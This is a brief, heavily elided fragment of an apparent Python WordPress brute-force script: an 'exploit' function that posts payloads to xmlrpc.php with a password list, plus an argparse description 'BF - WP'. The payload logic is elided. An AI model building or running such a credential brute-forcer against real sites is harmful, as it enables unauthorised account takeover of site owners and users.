...
def exploit(url, user_url, list_password):
	try:
		...
		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=1)
...
def main():
 	try:
 		parser = argparse.ArgumentParser(description='BF - WP')
